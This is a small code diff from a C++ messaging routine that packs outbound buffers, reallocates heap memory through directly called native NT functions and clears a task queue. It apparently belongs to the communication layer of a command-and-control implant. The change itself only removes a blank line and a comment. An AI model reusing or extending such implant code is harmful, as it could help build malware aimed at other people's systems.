@@ -177,7 +177,6 @@ namespace Message {
 
                     if (Ctx->Root) {
                         Stream::PackBytes(Outbound, S_CAST(PBYTE, Head->Buffer), Head->Length);
-
                     } else {
                         Outbound->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Outbound->Buffer, Outbound->Length + Head->Length);
                         x_memcpy(S_CAST(PBYTE, Outbound->Buffer) + Outbound->Length, Head->Buffer, Head->Length);
@@ -205,7 +204,6 @@ namespace Message {
         Stream::DestroyStream(Outbound);
         Outbound = nullptr;
 
-        // task is not getting properly parsed
         if (Inbound) {
             ClearQueue();
 
